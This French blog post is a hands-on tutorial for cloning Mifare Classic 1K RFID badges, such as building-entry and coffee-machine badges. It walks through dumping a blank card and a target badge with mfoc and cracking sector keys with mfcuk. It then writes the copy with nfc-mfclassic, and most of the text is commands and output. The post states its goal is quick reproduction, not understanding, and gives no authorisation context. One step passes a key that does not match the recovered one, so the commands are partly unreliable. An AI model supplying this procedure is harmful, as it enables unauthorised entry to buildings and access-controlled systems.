---
layout: post
title:  "Tuto - Copier un badge RFID - Mifare Classic 1K"
date:   2020-01-14 02:07:42 +0100
categories: hacking
author: Vixepti
image: /assets/2020/01/copy-mifare-thumbnail.jpg
tags: [RFID, NFC, mifare, mfoc, mfcuck, nfc-tools]
---
Dans cet article, on va voir la procédure pour copier un badge RFID Mifare Classic 1K (badge d'entrée d'immeuble, machines à café...).<!--more--> Le but est de reproduire simplement et rapidement un badge. Ce n'est pas de comprendre comment fonctionne le hack ou le système RFID. Pour ça je ferai certainement un article ou une série d'articles plus tard.

## Kali Linux
Dans un premier temps, il va falloir avoir une distribution linux à disposition. Pour cela, je recommande d'utiliser un Live Kali Linux qui comprends déjà les logiciels que l'on va utiliser.

{:refdef: style="text-align: center;"}
[![Résultat commande powershell](/assets/logos/kali-linux-logo-200x118.png)](/assets/logos/kali-linux-logo-200x118.png)
{: refdef}

!!!Important : Pas de machine virtuel. Ça ne fonctionnera certainement pas à cause des I/O USB - VM trop lentes. 

## Lecteur RFID
J'utilise personnellement le lecteur ACR122U. Pour les autres je n'ai jamais regardé comment ça se passe.

{:refdef: style="text-align: center;"}
[![Résultat commande powershell](/assets/2020/01/ACR122U.jpg)](https://www.banggood.com/NFC-ACR122U-RFID-Contactless-Smart-Reader-WriterUSB-SDK-Mifare-IC-Card-p-1268520.html?rmmds=search&cur_warehouse=CN)
{: refdef}

* Désactiver les modules pn533_usb et pn533 :

{% highlight shell_session %}
modprobe -r pn533_usb
modprobe -r pn533
{% endhighlight %}

* Vérification du fonctionnement, je place le badge à copier sur le lecteur.
* La commande suivante doit renvoyer des informations sur le badge :

{% highlight shell_session %}
nfc-list	
{% endhighlight %}

## Copie d'un badge
* Je place la carte vierge sur le lecteur.
* Dump de la carte vierge dans un fichier appelé *blank-card.dmp* :

{% highlight shell_session %}
mfoc -P 500 -O blank-card.dmp	
{% endhighlight %}

* Je place le badge à copier sur le lecteur.
* Dump du badge dans le fichier *badge.dmp* :

{% highlight shell_session %}
mfoc -P 500 -O badge.dmp	
{% endhighlight %}

* Parfois l'opération ne fonctionne pas. Ici, j'obtiens :

> "No sector encrypted with the default key has been found, exiting.."

* Je dois donc utiliser **mfcuck** :

{% highlight shell_session %}
mfcuk -C -R 0 -s 250 -S 250 -v 3 -o vigik.dmp
{% endhighlight %}

* L'opération à pris, dans mon cas, 30 minutes. À la fin j'obtiens un tableau avec la clé A et B (ici identique) sur le secteur 0 :

{% highlight shell_session %}
ACTION RESULTS MATRIX AFTER RECOVER - UID 1c df 0b 5c - TYPE 0x08 (MC1K)
---------------------------------------------------------------------
Sector	|    Key A	|ACTS | RESL	|    Key B	|ACTS | RESL
---------------------------------------------------------------------
0	|  8829da9daf76	| . R | . R	|  8829da9daf76	| . R | . R
1	|  000000000000	| . . | . .	|  000000000000	| . . | . .
2	|  000000000000	| . . | . .	|  000000000000	| . . | . .
3	|  000000000000	| . . | . .	|  000000000000	| . . | . .
4	|  000000000000	| . . | . .	|  000000000000	| . . | . .
5	|  000000000000	| . . | . .	|  000000000000	| . . | . .
6	|  000000000000	| . . | . .	|  000000000000	| . . | . .
7	|  000000000000	| . . | . .	|  000000000000	| . . | . .
8	|  000000000000	| . . | . .	|  000000000000	| . . | . .
9	|  000000000000	| . . | . .	|  000000000000	| . . | . .
10	|  000000000000	| . . | . .	|  000000000000	| . . | . .
11	|  000000000000	| . . | . .	|  000000000000	| . . | . .
12	|  000000000000	| . . | . .	|  000000000000	| . . | . .
13	|  000000000000	| . . | . .	|  000000000000	| . . | . .
14	|  000000000000	| . . | . .	|  000000000000	| . . | . .
15	|  000000000000	| . . | . .	|  000000000000	| . . | . .
{% endhighlight %}

* Je peux donc dumper le badge dans un fichier *badge.dmp* :

{% highlight shell_session %}
mfoc -P 500 -k 0123456789AB -O badge.dmp
{% endhighlight %}

* Une fois terminé, je replace le badge vierge sur le lecteur et je copie le dump sur ce dernier :

{% highlight shell_session %}
nfc-mfclassic W a badge.dmp blank-card.dmp
{% endhighlight %}
